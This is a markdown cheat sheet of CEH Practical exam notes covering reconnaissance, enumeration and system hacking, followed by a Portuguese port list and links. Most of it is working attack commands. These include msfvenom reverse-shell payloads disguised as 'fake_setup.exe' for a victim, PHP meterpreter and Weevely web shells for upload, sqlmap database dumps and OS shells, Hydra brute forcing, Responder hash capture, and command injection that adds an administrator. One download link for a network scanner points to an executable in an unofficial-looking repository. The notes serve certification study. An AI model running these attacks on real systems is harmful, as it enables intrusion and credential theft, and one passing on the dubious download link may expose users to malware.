# CEH---NOTES
Notes about CEH PRACTICAL EXAM

                                                                                                                          
# Reconnasiance/Footprinting
<details>
  <summary>Recon</summary>

* -r range , Scan Entire Network for ALive host using ARP
```console
:~$ netdiscover -r 192.168.29.1/24
```

* -f switch do not fragment, -l buffer size
```console
:~$ ping <host-ip> -f -l 1300
```
  * __`tracert`__ for windows cmd
```console
:~$ traceroute <host-ip>
```
* [Path Analyzer Pro](https://www.pathanalyzer.com/download.opp/) in traceroute tools, ensure icmp and smart is selected, stop on control is selected
* Start Metasploit Console
```console
:~# msfdb init && msfconsole
:~# msfdb status
```
* Nmap Scanning entire Network

```console
# Don’t ping=> -Pn, SYN scan=> -sS, Aggresive Scan=> -A, Normal_XML and Grepable format all at once=> -oA, Verbose=> -vv 

nmap -Pn -sS -A -oA <Filename> 10.10.1.1/24 -vv
```
* Convert Nmap XML file to [HTML Report](https://nmap.org/book/output-formats-output-to-html/)
```console
xsltproc <nmap-output.xml> -o <nmap-output.html>
```
```console
# Scanning SMB Version for OS Detection using Metaspolit
use scanner/smb/smb_version
show options 
set RHOSTS 10.10.10.8-16 
set THREADS 100 
run
  
#Type hosts again and os_flavor will be visible
  hosts
```
</details>

# Scanning Network
<details>
  <summary>Scan Network</summary>
  
* [Angry IP Scanner](https://angryip.org/download/#windows) of windows to Scan Entire Network
* [Advanced IP Scanner](https://github.com/infovault-Ytube/test1/raw/main/ipscan25.exe) free network scanner to analyze LAN
<img src="AdvancedIPScanner.jpg" />  

</details>
  
# ENUMERATION
<details>
  <summary>Enum</summary>

* [Hyena](https://www.systemtools.com/hyena/download.htm)
Expand local workstation to view Users, Services, User Rights, Scheduled Jobs 

* [NetBIOS Enumerator](http://nbtenum.sourceforge.net/)
Enter IP Range and click scan.

* NBT (NetBIOS over TCP/IP), which helps troubleshoot NetBIOS name resolution issues.
```console
nbtstat -A 204.224.150.3
```
* Accessing Shared Files
```console.
# List All Shared Resources
net view  <IP>

# Connect to Shared Resource
net use
net use \\10.10.10.1\e ""\user:""
net use \\10.10.10.1\e ""/user:""
```
* SNMP Enumeration
```shell
nmap -sU -p 161 10.10.1.2
nmap -sU -p 161 --script=snmp-brute 10.10.1.2

# Expoilt SNMP with Metasploit
msfdb init && msfconsole ↵
use auxilary/scanner/snmp/snmp_login ↵
set RHOSTS 10.10.1.2 ↵
exploit ↵
  
use auxilary/scanner/snmp/snmp_enum ↵
set RHOSTS 10.10.1.2 ↵
exploit ↵
```
* Enum4linux: Enumerating information from Windows and Samba systems
```console
enum4linux -A <Target_IP>
```
</details>
  
  # Vulnerability Analysis
<details>
  <summary>Vulerability</summary>
  
 * Nessus: Assest vulnerability scanner
 * Nikto: Web Server scanner
```console
nikto -h www.example.com tuning 1
  ```
  </details>
  
# System Hacking
<details>
  <summary> Sys password Hacking</summary>

```
# To Dump Windows SAM file hashes
pwDump7.exe> hashes.txt 
```
  > pwDump7.exe : To Dump Windows Hashes [PwDump7](https://www.tarasco.org/security/pwdump_7/pwdump7.zip)
  * [Ophcrack.exe](https://ophcrack.sourceforge.io/download.php?type=ophcrack) : To Crack SAM Hashes to obtain clear Password 
  * [rcrack_gui.exe](http://project-rainbowcrack.com/) : Use Raindow Table to crack hashes
  
  </details>

 
<details>
  <summary> Create A Reverse TCP Connection</summary>

```shell
# creates reverse TCP from windows  machine, send this file to victim machine via python-Webserver/shared resource
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<attacker_IP> LPORT=444 -o fake_setup.exe  ↵

msfdb init && msfconsole ↵
use exploit/multi/handler ↵
set LHOST=<attacker-IP>  ↵
set LPORT=444 ↵
  run
```
</details>

# Steganography
<details>
<summary> Stego</summary>

#### Hide/unhide text in WhiteSpaces using [snow](http://www.darkside.com.au/snow/)

```shell
SNOW.EXE -C -p 1234 -m "Secret Message"  original.txt ciper.txt
 
# To unhide the hidden text
 
SNOW.EXE -C -p 1234  ciper.txt
```
  
### [OpenStego](https://github.com/syvaidya/openstego/releases) : Hide any data within a cover file like Images
<img src="https://www.openstego.com/image/screenshot/01.png" width="600" height="400" />
<img src="https://www.openstego.com/image/screenshot/02.png" width="600" height="400" />  
  
### [QuickStego](http://cybernescence.co.uk/software-products/QS12Setup.exe): Hide text in pictures without password
<img src="http://quickcrypto.com/content-images/QuickStego_12_Steganography_Software_Ex_sml.jpg" width="600" height="400" /> 
</details>

  
  
#  LLMNR/NBT-NS Poisoning
<details>
<summary> LLMNR/NBT</summary>

> [Responder](https://github.com/lgandx/Responder) : rogue authentication server to capture hashes
>
>> This can be used to get the already logged-in user's password, who is trying to access a shared resource which is not present [Step by Step](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
  
```shell
# In Parrot/Kali OS, 
responder -I eth0  ↵

# In windows, try to access the shared resource, logs are stored at usr/share/responder/logs/SMB<filename>
# To crack that hash, use JohntheRipper
john SMB<filename>  ↵
  
```
  </details>
  
#  Website Hacking/Password Cracking
<details>
<summary>Website Cracking</summary>

* SkipFish : Active Recon for Websites 
  
```console
skipfish -o 202 http://192.168.1.202/wordpress
```

* Wordpress Site Login BruteForce [Step-By-Step](https://www.hackingarticles.in/multiple-ways-to-crack-wordpress-login/)
  
```shell
# Wordpress site only Users Enumeration
wpscan --url http://example.com/ceh --enumerate u 

# Direct crack if we have user/password details

wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt

# Using Metaspoilt
msfdb init && msfconsole
msf > use auxiliary/scanner/http/wordpress_login_enum
msf auxiliary(wordpress_login_enum) > set rhosts 192.168.1.100
msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
msf auxiliary(wordpress_login_enum) > set user_file user.txt
msf auxiliary(wordpress_login_enum) > set pass_file pass.txt
msf auxiliary(wordpress_login_enum) > exploit
  
  
```
### File Upload Vulnerability
```shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f raw > file.php
  
msfdb init && msfconsole
use multi/handler
set payload php/meterepreter/reverse_tcp
set LHOST=attacker-ip
set LPORT= attcker-port
run

# If incase, metaspolit not working use NetCat and shell code below

```
> [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) : Use the code, change IP & Port and use it with NetCat listener  
```console
nc -vnl -p 1234
```

> [Weevely](https://www.kali.org/tools/weevely/) : Generate PHP Reverse shell
```shell
  
weevely generate password123 /home/error.php

# Upload the above error.php to website and use the below cmd to get reverse shell

weevely http://domain.com/error.php password123  

```
  
### SQL Injection
> Login bypass with [' or 1=1 --](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt) 
> [N-Stalker](https://www.nstalker.com/) : Select OWASP Policy => Scan Website for Vulnerabilites
 
> SQLMAP
  
```shell
#List databases, add cookie values
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
  OR
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  


# List Tables, add databse name
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
  
# List Columns of that table
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
  
#Dump all values of the table
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
  

sqlmap -u "http:domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --os-shell
 
```
* Some links [DVWA:Blind SQL with SQLMap](https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7), [DVWA - High Level with SQLMap](https://www.youtube.com/watch?v=IR1JsaSQLMc&ab_channel=Archidote)
  
  
  
</details>

<details>
<summary>Password Cracking</summary>

> Hydra : FTP, SSH, Telnet
  
```console
# SSH
hydra -l username -P passlist.txt 192.168.0.100 ssh
  
 # FTP
hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100
 
# If the service isn't running on the default port, use -s
 hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221
  
# TELNET
hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet

# Login form
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"  
  
```
  
</details>
  
# Cryptography
 <details>
 <summary>Cipering / Encrypting/ Hashes </summary>
   
 #### Hash
 
> Find/Decrypt Hash Online with [Hashes.com](https://hashes.com/en/decrypt/hash)
 
```shell
 # In Kali
 $hash-identifier  
   
 #Decrypt Hashes
 hashcat '5f4dcc3b5aa765d61d8327deb882cf99' /usr/share/wordlists/rockyou.txt
```
> Calculate Hash of text/File by [HashCalc](https://www.slavasoft.com/download.htm) in Windows🪟
 <img src="https://www.slavasoft.com/images/screenshots/hashcalc.png" />
 
> [MD5Calculator](https://www.bullzip.com/download/md5/md5calc(1.0.0.0).zip) in Windows🪟
 <img src="https://www.bullzip.com/products/md5/dialog.png" />

### CryptoForge 
> Encrypt data with Password and only be decoded with cryptoforge by giving password
 <img src="Cryptoforge.jpg" />   

### BCTextEncoder: Text Encode/Decode
   
<img src="https://www.jetico.com/file-downloads/web_help/bctextencoder/img/textEncode.png" />   

### VeraCrypt: Disk Encrypt/Decrypt
> [Step-By-Step-Tutotrial](https://www.veracrypt.fr/en/Beginner%27s%20Tutorial.html)

### CrypTool : Encode/Decode Text (File Extension is .hex)
* File → New → Enter Text → Encrypt/Decrypt → Symmetric (Modern) → RC2 → KEY 05 → Encrypt 
   
* File → Open → Encrypt/Decrypt → Symmetric (Modern) → RC2 → KEY 05 → Decrypt


   <img src="Crytool.jpg" />   

  </details> 

# Android Hacking
<details>
<summary>ADB</summary>

> [Live Demo of ADB](https://www.youtube.com/watch?v=Hvreb4hjsig)

  ```shell
apt-get update
sudo apt-get install adb -y
adb devices -l

# Connection Establish Steps
adb connect 192.168.0.4:5555
adb devices -l
adb shell  

# Download a File from Android using ADB tool
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop
  
# =================================================================================================== 
  
# Same thing can be done via PhoneSploit tool 
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama
OR
python3 -m pip install colorama

python3 phonesploit.py

# Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
# Type 4, to Access Shell on phone

pwd
ls
cd sdcard
ls
cd Download

#Download File using PhoneSploit
9. Pull Folders from Phone to PC

Enter the Full Path of file to Download
sdcard/Download/secret.txt

  
 ```  
</details>
  
# Covert TCP
<details>
<summary>Covert</summary>
  
> Covert_tcp [source code](covert_tcp.c)
> Live Demo [Covert TCP Live Demo-Youtube](https://www.youtube.com/watch?v=bDcz4qIpiQ4)

```shell
# Compile the Code  
cc -o covert_tcp covert_tcp.c
  
# Reciever Machine(192.168.29.53)  
sudo ./covert_tcp -dest 192.168.29.53 -source 192.168.29.123 -source_port 9999 -dest_port 8888 -server -file recieve.txt  
 
# Sender Machine(192.168.29.123) 
# Create A Message file that need to be transferred Eg:secret.txt
sudo ./covert_tcp -dest 192.168.29.53 -source 192.168.29.123 -source_port 8888 -dest_port 9999 -file secret.txt

```
  
> [Wireshark Capture](Covert_TCP-Capture.pcapng) Hello  This 123 -
 
<img src="covertCapture.jpg" /> 
  
</details>
  
  
<details>
<summary>Misc</summary>
 
```shell
# If Python version returned above is 3.X
# On Windows, try "python -m http.server" or "py -3 -m http.server"
python3 -m http.server
# If Python version returned above is 2.X
python -m SimpleHTTPServer
```
  
> $python -m SimpleHTTPServer 9000
 
> $python3 -m http.server 9000

> nslookup www.domain.com
  
[FTP Server](https://archive.org/download/file-zilla-server-0-9-5/FileZilla_Server_0_9_5.exe) 
  
[YOUTUBE](https://www.youtube.com/watch?v=_4a4qSaIIrw)
  
> Command Injection ( IP| net user Test_user /Add )
  (| net user)
  (| net localgroup Administrators Test_user /Add)
  
File Upload Vul::
file.php
File.php.jpg
Add GIF98 and upload and rename .php.jgp

  Chain attack to execute, go in Command SHell and |copy c:\wamp64\www\DVWA\hackable\uploads\filename.php.jpg c:\wamp64\www\DVWA\hackable\uploads\shell.php
  
> Insert Username Password in Website: [blah;insert into login values ('john','pass123'); --]  
</details>
  
  
## CEH Practical Exam Questions:
https://cutt.ly/ceh-practical-git-udy

# Portas
<details>
<summary>All Ports</summary>

### Porta 17

	–>QOTD – TCP/UDP – O Serviço de Mensagem do dia (Quote Of The Day) é alvo de Trojans.

### Porta 19

	–> Chargen – TCP/UDP – Chargen é um protocolo de comunicação muito vulnerável, que é usado para amplificar os ataques DdoS, que é um ataque distribuído de negação de serviço.

### Porta 21

	–> FTP – TCP – É utilizado  o FTP que permite que computadores dentro de uma rede promovam trocas de arquivos em massa

 ### Porta 22

	–> SSH – TCP/UDP – É uma porta padrão para acesso remoto (normalmente baseados em sistemas LINUX).
	-> Para acesso as configurações ssh do servidor -> /etc/ssh/sshd_config
	-> Dentro das configurações pode ser alterado o numero da porta, tipos de conexão e etc, é uma boa prática de segurança que o usuário root esteja desabilitado a se autenticar via ssh.
	-> Um scan de portas com nmap normalmente acha o serviço ssh, mas atanção a alteração de numero de portas que é possível dentro das configurações, geralmente tambem é usada a porta 2222.
	 -> Dentro do diretorio root existe uma pasta oculta .ssh, onde ficam alguns arquivos, dentre eles o authorized_keys onde ficam as chaves autorizadas para conexão direta e o arquivo know_hosts onde ficam os fingerprints dos hosts que já tentaram conexão com esse servidor

### Porta 23

	–> Telnet – TCP/UDP – Telnet é um protocolo de comunicação que permite a execução remota de códigos maliciosos.

### Porta 67 | 68

	–> DHCP Server e Client – Pelo serviço DHCP é possível fazer uma configuração automática e dinâmica de computadores que estejam ligados a uma rede TCP/IP.

### Porta 111

	–> Portmap – TCP/UDP – O serviço portmap é um daemon (programa executado em background) para serviços RPC, como o NIS e o NFS, que pode autorizar a execução de códigos maliciosos.

### Porta 123

	–> NTP – UDP – O NTP é um protocolo para sincronizar relógios de computadores e equipamentos de rede, e pode ser vulnerável a servidores de NTP não confiáveis.

### Portas 135 | 136 | 137 | 138 | 139 

	–> Microsoft NetBios – TCP UDP – Estas portas são utilizadas no SO Windows para compartilhamento de arquivos e impressoras.

### Portas 161 | 162

	–> SNMP – TCP/UDP – As portas acima estão associadas com o protocolo de monitoramento SNMP, que devido a diversas vulnerabilidades, devem ser bloqueados na entrada, mas permitida a sua saída.

### Porta 1433

	–> ms-sql – TCP/UDP – Porta padrão de acesso ao SQL Server.

### Porta 1900 

	–> SSDP – UDP – O SSDP é um protocolo de descoberta de serviço com diversas vulnerabilidades. devem ser bloqueados na entrada, mas permitida a sua saída.

### Porta 3306 

	–> MYSQL – TCP/UDP – Porta padrão de acesso ao Mysql Server

### Porta 3389

	–> RDP – TCP/UDP – O RDP é um protocolo multi-canal que permite a conexão entre computadores remotamente, e que pode ser usado de maneira maliciosa. Quando aberta e se voce tem uma credencial pode usar o RDESKTOP do kali para acessar a maquina remotamente

### Porta 5353

	–> mDNS – UDP – O mDNS é um protocolo multi-canal que resolve a resolução de nomes de computadores em pequenas redes e possui enormes vulnerabilidades.

### Porta 5900

	–> VCN – TCP/UDP – O serviço VNC (Virtual Network Computing) pode permitir acesso indesejado ao computador que têm esse serviço habilitado,  podendo ser usado para ataques ou roubo de informações,
### Porta 10000

	–> TCP – Porta padrão de acesso ao Miniserv / Webmin httpd. 
</details>


# Links
<details>
<summary>Links para consulta</summary>

 Attacks Vector
https://www.upguard.com/blog/attack-vector

https://searchsecurity.techtarget.com/definition/attack-vector

https://www.balbix.com/insights/attack-vectors-and-breach-methods/

https://attack.mitre.org/

https://searchsecurity.techtarget.com/definition/attack-vector#:~:text=An%20attack%20vector%20is%20a,vulnerabilities%2C%20including%20the%20human%20element.

https://www.youtube.com/watch?v=LsuoJb7n3co

https://www.youtube.com/watch?v=rcB4EZLfi7I

https://www.youtube.com/watch?v=dz7Ntp7KQGA

Network Scanning
https://nmap.org/man/pt_BR/index.html

https://nmap.org/docs.html

https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/

https://hackertarget.com/nmap-tutorial/

https://www.stationx.net/nmap-cheat-sheet/

https://media.x-ra.de/doc/NmapCheatSheetv1.1.pdf

https://www.100security.com.br/netdiscover

https://kalilinuxtutorials.com/netdiscover-scan-live-hosts-network/

https://www.youtube.com/watch?v=PS677owUk-c

https://www.stationx.net/nmap-cheat-sheet/

https://redteamtutorials.com/2018/10/14/nmap-cheatsheet/

https://resources.infosecinstitute.com/nmap-cheat-sheet/#gref

https://medium.com/@infosecsanyam/nmap-cheat-sheet-nmap-scanning-types-scanning-commands-nse-scripts-868a7bd7f692

https://resources.infosecinstitute.com/network-discovery-tool/#gref

Enumeration
https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/

https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/

https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html

https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b

https://www.redsiege.com/blog/2020/04/user-enumeration-part-3-windows/

https://nmap.org/nsedoc/scripts/smb-enum-users.html

https://github.com/sensepost/UserEnum

Brute Force
https://linuxconfig.org/password-cracking-with-john-the-ripper-on-linux

https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/

https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/

https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/

https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-passwords-with-tamper-data-thc-hydra-0155374/

https://laconicwolf.com/2018/09/29/hashcat-tutorial-the-basics-of-cracking-passwords-with-hashcat/

https://medium.com/@sc015020/how-to-crack-passwords-with-john-the-ripper-fdb98449ff1

https://www.varonis.com/blog/john-the-ripper/

Wordlists
http://www.phenoelit.org/dpl/dpl.html

https://datarecovery.com/rd/default-passwords/

https://github.com/Dormidera/WordList-Compendium

https://github.com/danielmiessler/SecLists

https://www.kaggle.com/wjburns/common-password-list-rockyoutxt

SQL Injection
https://hackertarget.com/sqlmap-tutorial/

https://www.binarytides.com/sqlmap-hacking-tutorial/

https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/

https://medium.com/@rafaelrenovaci/dvwa-solution-sql-injection-blind-sqlmap-cd1461ad336e

https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7

https://www.exploit-db.com/docs/english/13701-easy-methodblind-sql-injection.pdf

https://gracefulsecurity.com/sql-injection-filter-evasion-with-sqlmap/

https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3

https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF

https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/

Steganography
https://resources.infosecinstitute.com/steganography-and-tools-to-perform-steganography/#gref

https://flylib.com/books/en/1.36.1/steganography.html

https://blog.eccouncil.org/what-is-steganography-and-what-are-its-popular-techniques/

https://www.edureka.co/blog/steganography-tutorial

https://www.tutorialspoint.com/image-based-steganography-using-python

https://medium.com/@KamranSaifullah/da-vinci-stenography-challenge-solution-90122a59822

https://medium.com/@chrisdare/steganography-in-computer-forensics-6d6e87d85c0a

https://www.telegraph.co.uk/culture/art/art-news/8197896/Mona-Lisa-painting-contains-hidden-code.html

https://medium.com/write-ups-hackthebox/tagged/steganography

http://moinkhans.blogspot.com/2015/06/steghide-beginners-tutorial.html

https://www.2daygeek.com/easy-way-hide-information-inside-image-and-sound-objects/

System Hacking
https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/

https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/

https://blog.rapid7.com/2017/03/21/combining-responder-and-psexec-for-internal-penetration-tests/

https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/

https://medium.com/@hninja049/how-to-easy-find-exploits-with-searchsploit-on-linux-4ce0b82c82fd

https://www.offensive-security.com/offsec/edb-searchsploit-update-2020/

https://www.youtube.com/watch?v=29GlfaH5qCM

https://www.hackingloops.com/maintaining-access-metasploit/

https://resources.infosecinstitute.com/information-gathering-using-metasploit/

https://www.youtube.com/watch?v=s6rwS7UuMt8

https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/

https://www.youtube.com/watch?v=joT8NxlXxVY

https://attack.mitre.org/techniques/T1557/001/

https://www.youtube.com/watch?v=0TBCzaBklcE

https://www.youtube.com/watch?v=FfoQFKhWUr0

https://www.youtube.com/watch?v=Fg2gvk0qgjM

https://www.youtube.com/watch?v=rjRDsXp_MNk

https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning

https://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7bef

https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/

Web Scanners
https://blog.clusterweb.com.br/?p=1297

https://hackertarget.com/nikto-tutorial/

https://geekflare.com/nikto-webserver-scanner/

https://www.youtube.com/watch?v=K78YOmbuT48

https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.html

https://www.hackingtutorials.org/web-application-hacking/hack-a-wordpress-website-with-wpscan/

https://linuxhint.com/wpscan_wordpress_vulnerabilities_scan/

https://www.youtube.com/watch?v=SS991k5Alp0

https://www.youtube.com/watch?v=MtyhOrBfG-E

https://www.youtube.com/watch?v=sQ4TtFdaiRA

https://www.exploit-db.com/docs/english/45556-wordpress-penetration-testing-using-wpscan-and-metasploit.pdf?rss

https://www.wpwhitesecurity.com/strong-wordpress-passwords-wpscan/

https://www.youtube.com/watch?v=BTGP5sZfJKY

https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-5-creating-custom-wordlist-with-cewl-0158855/

https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86

https://www.hackingarticles.in/comprehensive-guide-on-dirb-tool/

Sniffers
https://www.youtube.com/watch?v=TkCSr30UojM

https://www.varonis.com/blog/how-to-use-wireshark/

https://hackertarget.com/wireshark-tutorial-and-cheat-sheet/

https://www.lifewire.com/wireshark-tutorial-4143298

https://www.comparitech.com/net-admin/wireshark-cheat-sheet/

https://medium.com/hacker-toolbelt/wireshark-filters-cheat-sheet-eacdc438969c

https://github.com/security-cheatsheet/wireshark-cheatsheet

https://www.cellstream.com/resources/2013-09-10-11-55-21/cellstream-public-documents/wireshark-related/83-wireshark-display-filter-cheat-sheet/file

https://www.howtogeek.com/104278/how-to-use-wireshark-to-capture-filter-and-inspect-packets/

https://www.youtube.com/watch?v=4_7A8Ikp5Cc

https://www.guru99.com/wireshark-passwords-sniffer.html

https://danielmiessler.com/study/tcpdump/

https://hackertarget.com/tcpdump-examples/

https://opensource.com/article/18/10/introduction-tcpdump

Reviews and Details CEH Practical
https://www.linkedin.com/pulse/my-jouney-ceh-practical-joas-antonio-dos-santos (My Review)

https://forums.itpro.tv/topic/2604/ceh-practical/2

https://www.linkedin.com/pulse/considera%C3%A7%C3%B5es-sobre-o-exame-ceh-practical-leandro-cortiz/

https://infayer.com/archivos/65

https://medium.com/@jonaldallan/passed-ec-councils-certified-ethical-hacker-practical-20634b6f0f2

https://www.reddit.com/r/CEH/comments/c69fou/passed_ceh_practicalpost_exam_writeup/

https://www.reddit.com/r/CEH/comments/eeu3cx/ceh_practical_handson_exam_passed_with_2020_score/

https://www.reddit.com/r/CEH/comments/8wk2ve/ceh_vs_ceh_practical/

https://www.reddit.com/r/CEH/comments/dfa1y8/passed_ceh_practical/

https://www.reddit.com/r/CEH/comments/b1wgbs/ceh_v10_practical/

https://www.youtube.com/watch?v=ZYEo2AQdgcg

https://www.youtube.com/watch?v=MEYjyr65bJE

https://www.reddit.com/r/CEH/comments/ek0gzp/ceh_practical_passed_2020/

https://www.reddit.com/r/CEH/comments/evuztj/ceh_practical/

https://www.reddit.com/r/CEH/comments/f6t80r/can_ceh_practical_be_regarded_as_a/

https://www.reddit.com/r/CEH/comments/g6z6vn/just_passed_ceh_practical_1920/

https://medium.com/@jonathanchelmus/c-eh-practical-exam-review-42755546c82e

https://www.reddit.com/r/CEH/comments/hk6880/passing_ceh_practical/

https://www.reddit.com/r/CEH/comments/f629zk/ceh_practical_vs_ejpt_vs_ecppt/

https://www.youtube.com/watch?v=o1u69KvSFmQ&list=PLmQBbrHGk7jQbsvF3_xJp720yaUgeYCkj

https://www.youtube.com/watch?v=oYgtePf0z44

https://www.youtube.com/watch?v=9g5gdhoDotg&list=PLWGnVet-gN_kGHSHbWbeI0gtfYx3PnDZO

https://www.youtube.com/watch?v=LHU0OFcWSBk

https://medium.com/@mruur/ceh-practical-exam-review-918e76f831ff

https://www.youtube.com/c/XanderBilla/videos

https://www.youtube.com/watch?v=YZf5xmeaU58

https://newhorizons.com.sg/ceh-master/

https://www.iitlearning.com/certified-ethical-hacker-practical.php

https://medium.com/@anontuttuvenus/ceh-practical-exam-review-185ea4cef82a

https://www.cyberprotex.com/ceh.html

https://www.infosec4tc.com/product/ceh-master-exam1-exam2-practical/

https://sysaptechnologies.com/certified-ethical-hacker-ceh-v10-practical/

https://jensoroger.wordpress.com/2019/02/09/oscp-ceh-practical/

https://khroot.com/2020/06/20/certified-ethical-hacker-practical-review/

https://github.com/Samsar4/Ethical-Hacking-Labs

https://www.reddit.com/r/CEH/comments/jg0y6u/ceh_practical/

https://www.reddit.com/r/CEH/comments/dfa1y8/passed_ceh_practical/

https://www.reddit.com/r/CEH/comments/cgualo/ceh_practical_tell_me_about_it/

https://www.reddit.com/r/CEH/comments/c69fou/passed_ceh_practicalpost_exam_writeup/
